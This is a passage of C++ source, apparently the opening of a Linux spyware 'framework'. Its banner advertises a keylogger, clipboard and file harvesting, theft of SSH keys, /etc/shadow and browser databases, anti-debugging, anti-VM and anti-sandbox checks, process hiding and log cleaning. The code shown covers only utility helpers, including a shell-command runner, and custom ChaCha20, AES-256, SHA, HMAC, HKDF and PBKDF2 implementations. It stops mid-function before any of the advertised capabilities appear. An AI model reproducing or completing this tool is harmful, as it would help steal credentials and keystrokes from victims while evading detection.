%:include <iostream>
%:include <fstream>
%:include <sstream>
%:include <cstring>
%:include <cstdint>
%:include <cstdlib>
%:include <cstdio>
%:include <cmath>
%:include <vector>
%:include <string>
%:include <map>
%:include <set>
%:include <array>
%:include <list>
%:include <queue>
%:include <tuple>
%:include <algorithm>
%:include <functional>
%:include <memory>
%:include <chrono>
%:include <thread>
%:include <mutex>
%:include <atomic>
%:include <condition_variable>
%:include <iomanip>
%:include <numeric>
%:include <random>
%:include <bitset>
%:include <type_traits>
%:include <utility>
%:include <limits>
%:include <climits>
%:include <cerrno>
%:include <sys/io.h>
%:include <sys/mman.h>
%:include <sys/stat.h>
%:include <sys/types.h>
%:include <sys/socket.h>
%:include <sys/ioctl.h>
%:include <sys/utsname.h>
%:include <sys/ptrace.h>
%:include <sys/wait.h>
%:include <sys/time.h>
%:include <sys/resource.h>
%:include <sys/sysinfo.h>
%:include <sys/statvfs.h>
%:include <sys/file.h>
%:include <sys/prctl.h>
%:include <netinet/in.h>
%:include <arpa/inet.h>
%:include <net/if.h>
%:include <fcntl.h>
%:include <unistd.h>
%:include <dirent.h>
%:include <signal.h>
%:include <dlfcn.h>
%:include <elf.h>
%:include <cpuid.h>
%:include <poll.h>
%:include <linux/input.h>
%:include <linux/hidraw.h>
%:include <termios.h>
%:include <pwd.h>
%:include <grp.h>
%:include <sched.h>
%:include <glob.h>

/*
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║       APT HARDWARE INTELLIGENCE FRAMEWORK v5.0 REFINED         ║
 * ║       ─────────────────────────────────────────────             ║
 * ║                                                                 ║
 * ║  OFFLINE-ONLY intelligence collection & hardware profiling      ║
 * ║  No network C2, no self-spreading, no active exploitation       ║
 * ║  Pure passive reconnaissance & encrypted file output            ║
 * ║                                                                 ║
 * ║  Capabilities:                                                  ║
 * ║    [RECON]    Deep CPU/PCI/USB/SMBIOS/ACPI/DMA/GPU profiling   ║
 * ║    [CRYPTO]   ChaCha20, AES-256, SHA-256/512, HMAC, HKDF       ║
 * ║    [EVASION]  Anti-Debug(12), Anti-VM(10), Anti-Sandbox(8)      ║
 * ║    [CAPTURE]  Keylogger, clipboard, file harvesting             ║
 * ║    [CREDS]    SSH keys, shadow, browser DBs, config files       ║
 * ║    [PRIVESC]  Vulnerability scanning & assessment               ║
 * ║    [STEALTH]  Process hiding, log cleaning, memory protection   ║
 * ║    [OUTPUT]   Encrypted binary package with HMAC integrity      ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */

static volatile sig_atomic_t g_signal_caught = 0;
static std::mutex g_log_mutex;
static std::atomic<bool> g_running(true);

static void signal_handler(int sig) {
    g_signal_caught = sig;
    g_running.store(false);
}

static uint64_t get_monotonic_ns() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
    return static_cast<uint64_t>(ts.tv_sec) * 1000000000ULL + ts.tv_nsec;
}

static std::string bytes_to_hex(const uint8_t* data, size_t len) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; i++)
        oss << std::setw(2) << static_cast<int>(data[i]);
    return oss.str();
}

static std::string trim_string(const std::string& s) {
    size_t start = s.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    size_t end = s.find_last_not_of(" \t\r\n");
    return s.substr(start, end - start + 1);
}

static std::vector<std::string> split_string(const std::string& s, char delim) {
    std::vector<std::string> tokens;
    std::istringstream iss(s);
    std::string token;
    while (std::getline(iss, token, delim)) tokens.push_back(token);
    return tokens;
}

static std::string read_file_content(const std::string& path) {
    std::ifstream f(path);
    if (!f) return "";
    std::string content((std::istreambuf_iterator<char>(f)),
                        std::istreambuf_iterator<char>());
    return trim_string(content);
}

static bool file_exists(const std::string& path) {
    struct stat st;
    return stat(path.c_str(), &st) == 0;
}

static uint64_t file_size(const std::string& path) {
    struct stat st;
    if (stat(path.c_str(), &st) != 0) return 0;
    return static_cast<uint64_t>(st.st_size);
}

static bool write_file(const std::string& path, const std::string& content) {
    std::ofstream f(path);
    if (!f) return false;
    f << content;
    return f.good();
}

static bool write_binary_file(const std::string& path,
                              const uint8_t* data, size_t len) {
    std::ofstream f(path, std::ios::binary);
    if (!f) return false;
    f.write(reinterpret_cast<const char*>(data), len);
    return f.good();
}

static std::vector<uint8_t> read_binary_file(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return {};
    return std::vector<uint8_t>(
        (std::istreambuf_iterator<char>(f)),
        std::istreambuf_iterator<char>());
}

static bool is_root() {
    return getuid() == 0 || geteuid() == 0;
}

static std::string get_hostname() {
    char buf[256];
    gethostname(buf, sizeof(buf));
    return std::string(buf);
}

static std::string get_username() {
    struct passwd* pw = getpwuid(getuid());
    return pw ? std::string(pw->pw_name) : "unknown";
}

static std::string get_home_dir() {
    const char* home = getenv("HOME");
    if (home) return std::string(home);
    struct passwd* pw = getpwuid(getuid());
    return pw ? std::string(pw->pw_dir) : "/tmp";
}

static std::vector<std::string> glob_files(const std::string& pattern) {
    std::vector<std::string> results;
    glob_t g;
    if (glob(pattern.c_str(), GLOB_NOSORT, nullptr, &g) == 0) {
        for (size_t i = 0; i < g.gl_pathc; i++)
            results.push_back(g.gl_pathv[i]);
        globfree(&g);
    }
    return results;
}

static std::string exec_command(const std::string& cmd) {
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return result;
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
    pclose(pipe);
    return trim_string(result);
}

/* ══════════════════════════════════════════════════════════════
 *  SECTION 1: CRYPTOGRAPHIC ENGINE - پیاده‌سازی کامل از صفر
 * ══════════════════════════════════════════════════════════════ */

namespace Crypto {

class ChaCha20 {
private:
    uint32_t state[16];
    static inline uint32_t rotl32(uint32_t v, int n) {
        return (v << n) | (v >> (32 - n));
    }
    void quarter_round(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = rotl32(d, 16);
        c += d; b ^= c; b = rotl32(b, 12);
        a += b; d ^= a; d = rotl32(d, 8);
        c += d; b ^= c; b = rotl32(b, 7);
    }
    void block(uint32_t out[16]) {
        memcpy(out, state, 64);
        for (int i = 0; i < 10; i++) {
            quarter_round(out[0], out[4], out[8],  out[12]);
            quarter_round(out[1], out[5], out[9],  out[13]);
            quarter_round(out[2], out[6], out[10], out[14]);
            quarter_round(out[3], out[7], out[11], out[15]);
            quarter_round(out[0], out[5], out[10], out[15]);
            quarter_round(out[1], out[6], out[11], out[12]);
            quarter_round(out[2], out[7], out[8],  out[13]);
            quarter_round(out[3], out[4], out[9],  out[14]);
        }
        for (int i = 0; i < 16; i++) out[i] += state[i];
        state[12]++;
    }
public:
    void init(const uint8_t key[32], const uint8_t nonce[12], uint32_t counter = 0) {
        state[0] = 0x61707865; state[1] = 0x3320646e;
        state[2] = 0x79622d32; state[3] = 0x6b206574;
        memcpy(&state[4], key, 32);
        state[12] = counter;
        memcpy(&state[13], nonce, 12);
    }
    void process(uint8_t* data, size_t length) {
        uint32_t ks[16];
        size_t off = 0;
        while (off < length) {
            block(ks);
            size_t chunk = std::min(length - off, (size_t)64);
            uint8_t* k = reinterpret_cast<uint8_t*>(ks);
            for (size_t i = 0; i < chunk; i++) data[off + i] ^= k[i];
            off += chunk;
        }
    }
};

class AES256 {
private:
    uint32_t rk[60];
    static const uint8_t sbox[256];
    static const uint8_t mul2[256];
    static const uint8_t mul3[256];
    static const uint32_t rcon[10];

    uint32_t subword(uint32_t w) {
        return ((uint32_t)sbox[(w>>24)&0xFF]<<24) |
               ((uint32_t)sbox[(w>>16)&0xFF]<<16) |
               ((uint32_t)sbox[(w>>8)&0xFF]<<8) |
               (uint32_t)sbox[w&0xFF];
    }
    uint32_t rotword(uint32_t w) { return (w<<8)|(w>>24); }

    void key_expand(const uint8_t key[32]) {
        for (int i = 0; i < 8; i++)
            rk[i] = ((uint32_t)key[4*i]<<24)|((uint32_t)key[4*i+1]<<16)|
                    ((uint32_t)key[4*i+2]<<8)|(uint32_t)key[4*i+3];
        for (int i = 8; i < 60; i++) {
            uint32_t t = rk[i-1];
            if (i % 8 == 0) t = subword(rotword(t)) ^ rcon[i/8-1];
            else if (i % 8 == 4) t = subword(t);
            rk[i] = rk[i-8] ^ t;
        }
    }

    void sub_bytes(uint8_t s[16]) { for (int i=0;i<16;i++) s[i]=sbox[s[i]]; }

    void shift_rows(uint8_t s[16]) {
        uint8_t t;
        t=s[1]; s[1]=s[5]; s[5]=s[9]; s[9]=s[13]; s[13]=t;
        t=s[2]; s[2]=s[10]; s[10]=t; t=s[6]; s[6]=s[14]; s[14]=t;
        t=s[15]; s[15]=s[11]; s[11]=s[7]; s[7]=s[3]; s[3]=t;
    }

    void mix_columns(uint8_t s[16]) {
        for (int c=0;c<4;c++) {
            int i=c*4;
            uint8_t a0=s[i],a1=s[i+1],a2=s[i+2],a3=s[i+3];
            s[i]=mul2[a0]^mul3[a1]^a2^a3;
            s[i+1]=a0^mul2[a1]^mul3[a2]^a3;
            s[i+2]=a0^a1^mul2[a2]^mul3[a3];
            s[i+3]=mul3[a0]^a1^a2^mul2[a3];
        }
    }

    void add_rk(uint8_t s[16], int round) {
        for (int c=0;c<4;c++) {
            uint32_t k = rk[round*4+c];
            s[c*4]^=(k>>24)&0xFF; s[c*4+1]^=(k>>16)&0xFF;
            s[c*4+2]^=(k>>8)&0xFF; s[c*4+3]^=k&0xFF;
        }
    }

public:
    void init(const uint8_t key[32]) { key_expand(key); }

    void encrypt_block(const uint8_t in[16], uint8_t out[16]) {
        memcpy(out, in, 16);
        add_rk(out, 0);
        for (int r=1;r<14;r++) {
            sub_bytes(out); shift_rows(out); mix_columns(out); add_rk(out,r);
        }
        sub_bytes(out); shift_rows(out); add_rk(out, 14);
    }

    void ctr_process(const uint8_t nonce[12], uint8_t* data, size_t len) {
        uint8_t ctr[16], ks[16];
        memcpy(ctr, nonce, 12);
        ctr[12]=ctr[13]=ctr[14]=ctr[15]=0;
        size_t off = 0;
        while (off < len) {
            encrypt_block(ctr, ks);
            size_t chunk = std::min(len - off, (size_t)16);
            for (size_t i = 0; i < chunk; i++) data[off+i] ^= ks[i];
            off += chunk;
            for (int i=15; i>=12; i--) { if (++ctr[i] != 0) break; }
        }
    }
};

const uint8_t AES256::sbox[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};
const uint8_t AES256::mul2[256] = {
    0x00,0x02,0x04,0x06,0x08,0x0a,0x0c,0x0e,0x10,0x12,0x14,0x16,0x18,0x1a,0x1c,0x1e,
    0x20,0x22,0x24,0x26,0x28,0x2a,0x2c,0x2e,0x30,0x32,0x34,0x36,0x38,0x3a,0x3c,0x3e,
    0x40,0x42,0x44,0x46,0x48,0x4a,0x4c,0x4e,0x50,0x52,0x54,0x56,0x58,0x5a,0x5c,0x5e,
    0x60,0x62,0x64,0x66,0x68,0x6a,0x6c,0x6e,0x70,0x72,0x74,0x76,0x78,0x7a,0x7c,0x7e,
    0x80,0x82,0x84,0x86,0x88,0x8a,0x8c,0x8e,0x90,0x92,0x94,0x96,0x98,0x9a,0x9c,0x9e,
    0xa0,0xa2,0xa4,0xa6,0xa8,0xaa,0xac,0xae,0xb0,0xb2,0xb4,0xb6,0xb8,0xba,0xbc,0xbe,
    0xc0,0xc2,0xc4,0xc6,0xc8,0xca,0xcc,0xce,0xd0,0xd2,0xd4,0xd6,0xd8,0xda,0xdc,0xde,
    0xe0,0xe2,0xe4,0xe6,0xe8,0xea,0xec,0xee,0xf0,0xf2,0xf4,0xf6,0xf8,0xfa,0xfc,0xfe,
    0x1b,0x19,0x1f,0x1d,0x13,0x11,0x17,0x15,0x0b,0x09,0x0f,0x0d,0x03,0x01,0x07,0x05,
    0x3b,0x39,0x3f,0x3d,0x33,0x31,0x37,0x35,0x2b,0x29,0x2f,0x2d,0x23,0x21,0x27,0x25,
    0x5b,0x59,0x5f,0x5d,0x53,0x51,0x57,0x55,0x4b,0x49,0x4f,0x4d,0x43,0x41,0x47,0x45,
    0x7b,0x79,0x7f,0x7d,0x73,0x71,0x77,0x75,0x6b,0x69,0x6f,0x6d,0x63,0x61,0x67,0x65,
    0x9b,0x99,0x9f,0x9d,0x93,0x91,0x97,0x95,0x8b,0x89,0x8f,0x8d,0x83,0x81,0x87,0x85,
    0xbb,0xb9,0xbf,0xbd,0xb3,0xb1,0xb7,0xb5,0xab,0xa9,0xaf,0xad,0xa3,0xa1,0xa7,0xa5,
    0xdb,0xd9,0xdf,0xdd,0xd3,0xd1,0xd7,0xd5,0xcb,0xc9,0xcf,0xcd,0xc3,0xc1,0xc7,0xc5,
    0xfb,0xf9,0xff,0xfd,0xf3,0xf1,0xf7,0xf5,0xeb,0xe9,0xef,0xed,0xe3,0xe1,0xe7,0xe5
};
const uint8_t AES256::mul3[256] = {
    0x00,0x03,0x06,0x05,0x0c,0x0f,0x0a,0x09,0x18,0x1b,0x1e,0x1d,0x14,0x17,0x12,0x11,
    0x30,0x33,0x36,0x35,0x3c,0x3f,0x3a,0x39,0x28,0x2b,0x2e,0x2d,0x24,0x27,0x22,0x21,
    0x60,0x63,0x66,0x65,0x6c,0x6f,0x6a,0x69,0x78,0x7b,0x7e,0x7d,0x74,0x77,0x72,0x71,
    0x50,0x53,0x56,0x55,0x5c,0x5f,0x5a,0x59,0x48,0x4b,0x4e,0x4d,0x44,0x47,0x42,0x41,
    0xc0,0xc3,0xc6,0xc5,0xcc,0xcf,0xca,0xc9,0xd8,0xdb,0xde,0xdd,0xd4,0xd7,0xd2,0xd1,
    0xf0,0xf3,0xf6,0xf5,0xfc,0xff,0xfa,0xf9,0xe8,0xeb,0xee,0xed,0xe4,0xe7,0xe2,0xe1,
    0xa0,0xa3,0xa6,0xa5,0xac,0xaf,0xaa,0xa9,0xb8,0xbb,0xbe,0xbd,0xb4,0xb7,0xb2,0xb1,
    0x90,0x93,0x96,0x95,0x9c,0x9f,0x9a,0x99,0x88,0x8b,0x8e,0x8d,0x84,0x87,0x82,0x81,
    0x9b,0x98,0x9d,0x9e,0x97,0x94,0x91,0x92,0x83,0x80,0x85,0x86,0x8f,0x8c,0x89,0x8a,
    0xab,0xa8,0xad,0xae,0xa7,0xa4,0xa1,0xa2,0xb3,0xb0,0xb5,0xb6,0xbf,0xbc,0xb9,0xba,
    0xfb,0xf8,0xfd,0xfe,0xf7,0xf4,0xf1,0xf2,0xe3,0xe0,0xe5,0xe6,0xef,0xec,0xe9,0xea,
    0xcb,0xc8,0xcd,0xce,0xc7,0xc4,0xc1,0xc2,0xd3,0xd0,0xd5,0xd6,0xdf,0xdc,0xd9,0xda,
    0x5b,0x58,0x5d,0x5e,0x57,0x54,0x51,0x52,0x43,0x40,0x45,0x46,0x4f,0x4c,0x49,0x4a,
    0x6b,0x68,0x6d,0x6e,0x67,0x64,0x61,0x62,0x73,0x70,0x75,0x76,0x7f,0x7c,0x79,0x7a,
    0x3b,0x38,0x3d,0x3e,0x37,0x34,0x31,0x32,0x23,0x20,0x25,0x26,0x2f,0x2c,0x29,0x2a,
    0x0b,0x08,0x0d,0x0e,0x07,0x04,0x01,0x02,0x13,0x10,0x15,0x16,0x1f,0x1c,0x19,0x1a
};
const uint32_t AES256::rcon[10] = {
    0x01000000,0x02000000,0x04000000,0x08000000,0x10000000,
    0x20000000,0x40000000,0x80000000,0x1b000000,0x36000000
};

class SHA256 {
private:
    uint32_t h[8];
    uint8_t buffer[64];
    uint64_t total_len;
    size_t buf_len;
    static const uint32_t k[64];

    static inline uint32_t rotr(uint32_t x, int n) { return (x>>n)|(x<<(32-n)); }
    static inline uint32_t ch(uint32_t x,uint32_t y,uint32_t z){return (x&y)^(~x&z);}
    static inline uint32_t maj(uint32_t x,uint32_t y,uint32_t z){return (x&y)^(x&z)^(y&z);}
    static inline uint32_t sig0(uint32_t x){return rotr(x,2)^rotr(x,13)^rotr(x,22);}
    static inline uint32_t sig1(uint32_t x){return rotr(x,6)^rotr(x,11)^rotr(x,25);}
    static inline uint32_t gam0(uint32_t x){return rotr(x,7)^rotr(x,18)^(x>>3);}
    static inline uint32_t gam1(uint32_t x){return rotr(x,17)^rotr(x,19)^(x>>10);}

    void transform(const uint8_t blk[64]) {
        uint32_t w[64];
        for (int i=0;i<16;i++)
            w[i]=((uint32_t)blk[i*4]<<24)|((uint32_t)blk[i*4+1]<<16)|
                 ((uint32_t)blk[i*4+2]<<8)|(uint32_t)blk[i*4+3];
        for (int i=16;i<64;i++) w[i]=gam1(w[i-2])+w[i-7]+gam0(w[i-15])+w[i-16];

        uint32_t a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hv=h[7];
        for (int i=0;i<64;i++) {
            uint32_t t1=hv+sig1(e)+ch(e,f,g)+k[i]+w[i];
            uint32_t t2=sig0(a)+maj(a,b,c);
            hv=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
        }
        h[0]+=a;h[1]+=b;h[2]+=c;h[3]+=d;h[4]+=e;h[5]+=f;h[6]+=g;h[7]+=hv;
    }
public:
    void init() {
        h[0]=0x6a09e667;h[1]=0xbb67ae85;h[2]=0x3c6ef372;h[3]=0xa54ff53a;
        h[4]=0x510e527f;h[5]=0x9b05688c;h[6]=0x1f83d9ab;h[7]=0x5be0cd19;
        total_len=0;buf_len=0;
    }
    void update(const uint8_t* data, size_t len) {
        total_len += len; size_t off=0;
        if (buf_len>0) {
            size_t cp=std::min(64-buf_len,len);
            memcpy(buffer+buf_len,data,cp); buf_len+=cp; off+=cp;
            if (buf_len==64){transform(buffer);buf_len=0;}
        }
        while (off+64<=len){transform(data+off);off+=64;}
        if (off<len){buf_len=len-off;memcpy(buffer,data+off,buf_len);}
    }
    void finalize(uint8_t digest[32]) {
        uint64_t bl=total_len*8;
        uint8_t pad=0x80; update(&pad,1);
        pad=0; while(buf_len!=56) update(&pad,1);
        uint8_t lb[8];
        for(int i=7;i>=0;i--) lb[7-i]=(bl>>(i*8))&0xFF;
        update(lb,8);
        for(int i=0;i<8;i++){
            digest[i*4]=(h[i]>>24)&0xFF;digest[i*4+1]=(h[i]>>16)&0xFF;
            digest[i*4+2]=(h[i]>>8)&0xFF;digest[i*4+3]=h[i]&0xFF;
        }
    }
    static std::array<uint8_t,32> hash(const uint8_t* data,size_t len) {
        SHA256 ctx;ctx.init();ctx.update(data,len);
        std::array<uint8_t,32> d;ctx.finalize(d.data());return d;
    }
    static std::array<uint8_t,32> hash(const std::vector<uint8_t>& data) {
        return hash(data.data(),data.size());
    }
    static std::string hash_hex(const uint8_t* data,size_t len) {
        auto d=hash(data,len);return bytes_to_hex(d.data(),32);
    }
};
const uint32_t SHA256::k[64]={
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

class SHA512 {
private:
    uint64_t h[8];
    uint8_t buffer[128];
    uint64_t total_lo,total_hi;
    size_t buf_len;
    static const uint64_t k[80];
    static inline uint64_t rotr64(uint64_t x,int n){return (x>>n)|(x<<(64-n));}
    void transform(const uint8_t blk[128]) {
        uint64_t w[80];
        for(int i=0;i<16;i++){w[i]=0;for(int j=0;j<8;j++)w[i]|=(uint64_t)blk[i*8+j]<<((7-j)*8);}
        for(int i=16;i<80;i++){
            uint64_t s0=rotr64(w[i-15],1)^rotr64(w[i-15],8)^(w[i-15]>>7);
            uint64_t s1=rotr64(w[i-2],19)^rotr64(w[i-2],61)^(w[i-2]>>6);
            w[i]=w[i-16]+s0+w[i-7]+s1;
        }
        uint64_t a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hv=h[7];
        for(int i=0;i<80;i++){
            uint64_t S1=rotr64(e,14)^rotr64(e,18)^rotr64(e,41);
            uint64_t ch=(e&f)^(~e&g);
            uint64_t t1=hv+S1+ch+k[i]+w[i];
            uint64_t S0=rotr64(a,28)^rotr64(a,34)^rotr64(a,39);
            uint64_t mj=(a&b)^(a&c)^(b&c);
            uint64_t t2=S0+mj;
            hv=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
        }
        h[0]+=a;h[1]+=b;h[2]+=c;h[3]+=d;h[4]+=e;h[5]+=f;h[6]+=g;h[7]+=hv;
    }
public:
    void init() {
        h[0]=0x6a09e667f3bcc908ULL;h[1]=0xbb67ae8584caa73bULL;
        h[2]=0x3c6ef372fe94f82bULL;h[3]=0xa54ff53a5f1d36f1ULL;
        h[4]=0x510e527fade682d1ULL;h[5]=0x9b05688c2b3e6c1fULL;
        h[6]=0x1f83d9abfb41bd6bULL;h[7]=0x5be0cd19137e2179ULL;
        total_lo=total_hi=0;buf_len=0;
    }
    void update(const uint8_t* data,size_t len) {
        total_lo+=len;if(total_lo<len)total_hi++;
        size_t off=0;
        if(buf_len>0){size_t cp=std::min(128-buf_len,len);memcpy(buffer+buf_len,data,cp);buf_len+=cp;off+=cp;if(buf_len==128){transform(buffer);buf_len=0;}}
        while(off+128<=len){transform(data+off);off+=128;}
        if(off<len){buf_len=len-off;memcpy(buffer,data+off,buf_len);}
    }
    void finalize(uint8_t digest[64]) {
        uint64_t bl=total_lo*8,bh=total_hi*8+(total_lo>>61);
        uint8_t pad=0x80;update(&pad,1);pad=0;while(buf_len!=112)update(&pad,1);
        uint8_t lb[16];
        for(int i=0;i<8;i++){lb[i]=(bh>>((7-i)*8))&0xFF;lb[8+i]=(bl>>((7-i)*8))&0xFF;}
        update(lb,16);
        for(int i=0;i<8;i++)for(int j=0;j<8;j++)digest[i*8+j]=(h[i]>>((7-j)*8))&0xFF;
    }
    static std::array<uint8_t,64> hash(const uint8_t* data,size_t len){
        SHA512 ctx;ctx.init();ctx.update(data,len);
        std::array<uint8_t,64> d;ctx.finalize(d.data());return d;
    }
};
const uint64_t SHA512::k[80]={
    0x428a2f98d728ae22ULL,0x7137449123ef65cdULL,0xb5c0fbcfec4d3b2fULL,0xe9b5dba58189dbbcULL,
    0x3956c25bf348b538ULL,0x59f111f1b605d019ULL,0x923f82a4af194f9bULL,0xab1c5ed5da6d8118ULL,
    0xd807aa98a3030242ULL,0x12835b0145706fbeULL,0x243185be4ee4b28cULL,0x550c7dc3d5ffb4e2ULL,
    0x72be5d74f27b896fULL,0x80deb1fe3b1696b1ULL,0x9bdc06a725c71235ULL,0xc19bf174cf692694ULL,
    0xe49b69c19ef14ad2ULL,0xefbe4786384f25e3ULL,0x0fc19dc68b8cd5b5ULL,0x240ca1cc77ac9c65ULL,
    0x2de92c6f592b0275ULL,0x4a7484aa6ea6e483ULL,0x5cb0a9dcbd41fbd4ULL,0x76f988da831153b5ULL,
    0x983e5152ee66dfabULL,0xa831c66d2db43210ULL,0xb00327c898fb213fULL,0xbf597fc7beef0ee4ULL,
    0xc6e00bf33da88fc2ULL,0xd5a79147930aa725ULL,0x06ca6351e003826fULL,0x142929670a0e6e70ULL,
    0x27b70a8546d22ffcULL,0x2e1b21385c26c926ULL,0x4d2c6dfc5ac42aedULL,0x53380d139d95b3dfULL,
    0x650a73548baf63deULL,0x766a0abb3c77b2a8ULL,0x81c2c92e47edaee6ULL,0x92722c851482353bULL,
    0xa2bfe8a14cf10364ULL,0xa81a664bbc423001ULL,0xc24b8b70d0f89791ULL,0xc76c51a30654be30ULL,
    0xd192e819d6ef5218ULL,0xd69906245565a910ULL,0xf40e35855771202aULL,0x106aa07032bbd1b8ULL,
    0x19a4c116b8d2d0c8ULL,0x1e376c085141ab53ULL,0x2748774cdf8eeb99ULL,0x34b0bcb5e19b48a8ULL,
    0x391c0cb3c5c95a63ULL,0x4ed8aa4ae3418acbULL,0x5b9cca4f7763e373ULL,0x682e6ff3d6b2b8a3ULL,
    0x748f82ee5defb2fcULL,0x78a5636f43172f60ULL,0x84c87814a1f0ab72ULL,0x8cc702081a6439ecULL,
    0x90befffa23631e28ULL,0xa4506cebde82bde9ULL,0xbef9a3f7b2c67915ULL,0xc67178f2e372532bULL,
    0xca273eceea26619cULL,0xd186b8c721c0c207ULL,0xeada7dd6cde0eb1eULL,0xf57d4f7fee6ed178ULL,
    0x06f067aa72176fbaULL,0x0a637dc5a2c898a6ULL,0x113f9804bef90daeULL,0x1b710b35131c471bULL,
    0x28db77f523047d84ULL,0x32caab7b40c72493ULL,0x3c9ebe0a15c9bebcULL,0x431d67c49c100d4cULL,
    0x4cc5d4becb3e42b6ULL,0x597f299cfc657e2aULL,0x5fcb6fab3ad6faecULL,0x6c44198c4a475817ULL
};

class HMAC_SHA256 {
public:
    static std::array<uint8_t,32> compute(const uint8_t* key,size_t kl,const uint8_t* data,size_t dl){
        uint8_t kp[64];memset(kp,0,64);
        if(kl>64){auto hk=SHA256::hash(key,kl);memcpy(kp,hk.data(),32);}
        else memcpy(kp,key,kl);
        uint8_t ip[64],op[64];
        for(int i=0;i<64;i++){ip[i]=kp[i]^0x36;op[i]=kp[i]^0x5c;}
        SHA256 inner;inner.init();inner.update(ip,64);inner.update(data,dl);
        uint8_t ih[32];inner.finalize(ih);
        SHA256 outer;outer.init();outer.update(op,64);outer.update(ih,32);
        std::array<uint8_t,32> r;outer.finalize(r.data());return r;
    }
};

class HKDF {
public:
    static std::vector<uint8_t> derive(const uint8_t* ikm,size_t il,const uint8_t* salt,size_t sl,
                                        const uint8_t* info,size_t infl,size_t ol){
        auto prk=HMAC_SHA256::compute(salt,sl,ikm,il);
        std::vector<uint8_t> out;
        uint8_t t[32];uint8_t ctr=1;size_t tl=0;
        while(out.size()<ol){
            std::vector<uint8_t> inp;
            if(tl>0)inp.insert(inp.end(),t,t+tl);
            inp.insert(inp.end(),info,info+infl);
            inp.push_back(ctr);
            auto blk=HMAC_SHA256::compute(prk.data(),32,inp.data(),inp.size());
            memcpy(t,blk.data(),32);tl=32;
            size_t need=std::min(ol-out.size(),(size_t)32);
            out.insert(out.end(),t,t+need);ctr++;
        }
        return out;
    }
};

class PBKDF2 {
public:
    static std::vector<uint8_t> derive(const uint8_t* pw,size_t pl,const uint8_t* salt,size_t sl,int iters,size_t dkl){
        std::vector<uint8_t> out;uint32_t bn=1;
        while(out.size()<dkl){
            std::vector<uint8_t> sb(salt,salt+sl);
            sb.push_back((bn>>24)&0xFF);sb.push_back((bn>>16)&0xFF);
            sb.push_back((bn>>8)&0xFF);sb.push_back(bn&0xFF);
            auto u=HMAC_SHA256::compute(pw,pl,sb.data(),sb.size());
            std::array<uint8_t,32> res=u;
